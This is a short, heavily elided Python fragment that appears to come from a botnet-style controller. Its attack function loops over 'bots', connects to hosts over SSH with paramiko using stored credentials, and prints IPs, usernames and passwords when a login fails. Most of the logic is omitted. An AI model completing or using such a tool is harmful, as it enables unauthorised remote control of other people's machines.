...
def attack(ip, command, puerto, tipo):
    ...
    for i in range(total_bots):
        ...
        try:
            ...
            print(f'[*] Authentication Failed IP:{ip_equipos[i]} USER:{user_equipos[i]} PASS={password_equipos[i]}')

        except paramiko.SSHException:

            print(f'[*] The request was rejected or the channel was closed IP:{ip_equipos[i]} USER:{user_equipos[i]} PASS={password_equipos[i]}')
